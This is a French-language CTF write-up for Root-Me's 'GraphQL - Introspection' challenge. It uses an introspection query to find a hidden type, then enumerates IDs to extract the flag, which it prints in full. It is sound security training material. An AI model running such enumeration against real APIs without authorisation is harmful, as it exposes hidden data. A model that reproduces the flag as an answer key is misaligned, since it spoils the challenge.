## Challenges

### Serveur Web

### Challenge: GraphQL - Introspection

#### Problème

Cette épreuve vous invite à l’exploration d’un schéma GraphQL avec la fonctionnalité d’introspection .

#### Etape1: Inspecter code 

En examinant la page du site web, on constate qu'il y a des requêtes qui sont en arrière-plan. Pour ce faire, nous inspectons le code source de la page et examinons le réseau de la page. Dans la section "Network" de l'inspecteur, nous pouvons voir les requêtes effectuées par le site web. Nous actualisons la page web, choisissons un pays et effectuons une recherche (cela se fait sur la page web). Nous remarquons qu'une requête "rocketql" s'ajoute à notre réseau. En cliquant sur cette dernière, nous pouvons voir les détails de la requête, y compris les en-têtes, les paramètres, les cookies, etc. Dans les en-têtes ("Headers"), nous pouvons voir que la requête est effectuée avec la méthode "POST" et que l'URL de la requête est : "http://challenge01.root-me.org:59077/rocketql".

#### Etape1: Résolution 

Sur Insomnia :
On choisit "GraphQL" au lieu de JSON, et on tape l'URL de la requête "http://challenge01.root-me.org:59077/rocketql" dans la barre d'adresse.
On fait "New Request", et on ajoute le contenu suivant dans le corps de la requête :
```
{
	__schema {
		types {
			name
		}
	}
}
```
On envoie la requête et on obtient :
```
{
	"data": {
		"__schema": {
			"types": [
				{
					"name": "Rocket"
				},
				{
					"name": "Int"
				},
				{
					"name": "String"
				},
				{
					"name": "IAmNotHere"
				},
				{
					"name": "Query"
				},
				{
					"name": "Boolean"
				},
				{
					"name": "__Schema"
				},
				{
					"name": "__Type"
				},
				{
					"name": "__TypeKind"
				},
				{
					"name": "__Field"
				},
				{
					"name": "__InputValue"
				},
				{
					"name": "__EnumValue"
				},
				{
					"name": "__Directive"
				},
				{
					"name": "__DirectiveLocation"
				}
			]
		}
	}
}
```
Nous en retrouvons plusieurs types, dont « IAmNotHere » (qui semble prometteur).
En savoir plus sur le type « IAmNotHere » en utilisant la requête suivante :
```
{
	IAmNotHere(very_long_id: 1) {
		very_long_id
		very_long_value
		__typename
	}
}
```
et on obtient :
```
{
	"data": {
		"IAmNotHere": [
			{
				"very_long_id": 1,
				"very_long_value": "n",
				"__typename": "IAmNotHere"
			}
		]
	}
}
```

Nous avons obtenu une valeur pour le type "IAmNotHere". Donc il y a 2 champs : very_long_id & very_long_value. C'est le champ very_long_value qui contient la valeur "n". À chaque fois que nous modifions la valeur de very_long_id, nous obtenons une autre lettre.

La phrase obtenue après avoir modifié l'ID de 1 à 15 est "Nothing here Lol", puis nous cherchons dans les prochains IDs. Une fois que nous avons saisi l'ID 17, nous obtenons le flag.
```
{
	"data": {
		"IAmNotHere": [
			{
				"very_long_id": 17,
				"very_long_value": "Congratulations, you can use this flag: RM{1ntr0sp3ct1On_1s_us3ful}",
				"__typename": "IAmNotHere"
			}
		]
	}
}
```
#### Solution

Le flag est : `RM{1ntr0sp3ct1On_1s_us3ful}`.